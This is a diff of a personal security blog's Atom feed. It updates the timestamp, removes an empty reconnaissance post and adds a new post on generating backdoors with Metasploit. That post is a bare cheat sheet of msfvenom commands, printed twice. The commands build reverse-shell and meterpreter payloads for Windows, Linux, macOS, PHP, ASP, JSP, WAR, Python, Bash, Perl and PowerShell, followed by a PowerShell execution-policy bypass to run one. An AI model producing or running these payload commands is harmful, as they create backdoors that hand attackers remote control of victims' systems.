@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://jackstrom0904.github.io</id>
     <title>Error404</title>
-    <updated>2020-03-20T02:00:33.686Z</updated>
+    <updated>2020-03-24T07:25:26.696Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://jackstrom0904.github.io"/>
     <link rel="self" href="https://jackstrom0904.github.io/atom.xml"/>
@@ -10,6 +10,62 @@
     <logo>https://jackstrom0904.github.io/images/avatar.png</logo>
     <icon>https://jackstrom0904.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Error404</rights>
+    <entry>
+        <title type="html"><![CDATA[MSF生成各类后门]]></title>
+        <id>https://jackstrom0904.github.io/_zxYWzWWT</id>
+        <link href="https://jackstrom0904.github.io/_zxYWzWWT">
+        </link>
+        <updated>2020-03-24T07:24:26.000Z</updated>
+        <summary type="html"><![CDATA[<p>Windows<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f exe &gt; shell.exe<br>
+Linux<br>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f elf &gt; shell.elf<br>
+Mac<br>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f macho &gt; shell.macho<br>
+PHP<br>
+msfvenom -p php/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.php<br>
+ASP<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f asp &gt; shell.asp<br>
+JSP<br>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.jsp<br>
+WAR<br>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f war &gt; shell.war<br>
+Python<br>
+msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.py<br>
+Bash<br>
+msfvenom -p cmd/unix/reverse_bash LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.sh<br>
+Perl<br>
+msfvenom -p cmd/unix/reverse_perl LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.pl<br>
+Powershell<br>
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=6666 -f psh &gt; shell.ps1<br>
+powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>Windows<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f exe &gt; shell.exe<br>
+Linux<br>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f elf &gt; shell.elf<br>
+Mac<br>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f macho &gt; shell.macho<br>
+PHP<br>
+msfvenom -p php/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.php<br>
+ASP<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f asp &gt; shell.asp<br>
+JSP<br>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.jsp<br>
+WAR<br>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f war &gt; shell.war<br>
+Python<br>
+msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.py<br>
+Bash<br>
+msfvenom -p cmd/unix/reverse_bash LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.sh<br>
+Perl<br>
+msfvenom -p cmd/unix/reverse_perl LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.pl<br>
+Powershell<br>
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=6666 -f psh &gt; shell.ps1<br>
+powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
+<!-- more -->
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[CORS跨域资源共享漏洞]]></title>
         <id>https://jackstrom0904.github.io/sFeAdmB8q</id>
@@ -587,17 +643,6 @@ http://192.168.188.134:9001/login  #IP地址为安装机器的地址<br>
         </link>
         <updated>2020-01-25T09:03:45.000Z</updated>
         <content type="html"><![CDATA[<p>2</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[渗透测试之基础信息收集]]></title>
-        <id>https://jackstrom0904.github.io/axcjIUufJ</id>
-        <link href="https://jackstrom0904.github.io/axcjIUufJ">
-        </link>
-        <updated>2020-01-25T09:02:01.000Z</updated>
-        <content type="html"><![CDATA[<ol>
-<li></li>
-</ol>
 ]]></content>
     </entry>
 </feed>
